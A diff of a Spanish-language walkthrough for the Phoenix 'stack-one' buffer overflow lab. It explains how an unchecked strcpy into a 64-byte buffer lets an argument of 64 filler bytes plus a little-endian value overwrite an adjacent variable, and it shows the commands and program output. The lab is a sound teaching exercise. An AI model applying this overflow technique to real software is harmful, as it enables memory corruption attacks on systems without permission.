@@ -25,11 +25,13 @@ El binario está ubicado en:
 
 ---
 
+## Análisis del código
 
-**Consejos:**
+El programa copia el argumento del usuario dentro de un buffer de 64 bytes, pero no controla el tamaño con strcpy.
+Esto nos permite escribir más allá del buffer y modificar la variable changeme, que está justo después en la memoria.
 
-- `man ascii` Puedo decirte cuáles son los caracteres hexadecimales.
-- ¿Tiene problemas? ¿Cómo funciona el [endianidad](https://en.wikipedia.org/wiki/Endianness) ¿De la arquitectura afecta el diseño de cómo se disponen las variables?
+El objetivo es ponerle el valor 0x496c5962.
+
 
 ```c
 /*
@@ -92,7 +94,9 @@ int main(int argc, char **argv) {
 
 ```
 
-Se corre el programa y como se ve en el código se le debe pasar un parámetro
+**Ejecución inicial**
+
+Si ejecutamos el binario sin argumentos:
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one 
@@ -100,7 +104,7 @@ Welcome to phoenix/stack-one, brought to you by https://exploit.education
 stack-one: specify an argument, to be copied into the "buffer"
 ```
 
-al poner un valor como A nos devuelve que cada vez más cerca y nos da el valor de 0x00000000
+Con un solo carácter (A) vemos que changeme sigue en cero: nos da el valor de 0x00000000
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one A
@@ -109,8 +113,9 @@ Getting closer! changeme is currently 0x00000000, we want 0x496c5962
 
 ```
 
-Al poner los 64 caracteres como en el pasado y despues seguir con BBBB nos dice el mismo mensaje pero ahora se ha cambiado el valor por 0x42424242 lo cual quiere decir que ya cambiamos el valor 
+**Desbordamiento del buffer**
 
+Probamos llenando el buffer con 64 caracteres A, y luego añadimos BBBB (hex: 0x42424242). ya con esto logramos sobreescribir la variable changeme
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A"*64'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -120,7 +125,9 @@ Getting closer! changeme is currently 0x42424242, we want 0x496c5962
 
 ```
 
-ahora vamos a poner el valor esperado y vemos que se cumple con el reto
+**Escribiendo el valor correcto**
+
+El valor esperado es 0x496c5962. En little endian, debe enviarse como: \x62\x59\x6c\x49 y con esto vemos que superamos el reto.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c 'print "A" * 64 + "\x62\x59\x6c\x49"')
@@ -128,7 +135,9 @@ Welcome to phoenix/stack-one, brought to you by https://exploit.education
 Well done, you have successfully set changeme to the correct value
 ```
 
-Se realiza el exploit para este reto
+**Exploit con Pwntools**
+
+Creamos un script en Python3 para automatizarlo:
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/1_stack-one]
@@ -157,6 +166,8 @@ Se realiza el exploit para este reto
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
+**Resultado final**
+
 Se evidencia el mensaje que indica que el reto fue completado
 
 ```c
@@ -180,3 +191,7 @@ Se evidencia el mensaje que indica que el reto fue completado
     Well done, you have successfully set changeme to the correct value
 
 ```
+
+**Conclusión**
+
+Este nivel muestra cómo un desbordamiento de buffer puede alterar el flujo normal de un programa, permitiendo modificar valores en memoria que originalmente no deberían cambiarse. El reto introduce la importancia de comprender la disposición de la pila y cómo un manejo inseguro de cadenas de caracteres abre la puerta a vulnerabilidades críticas.
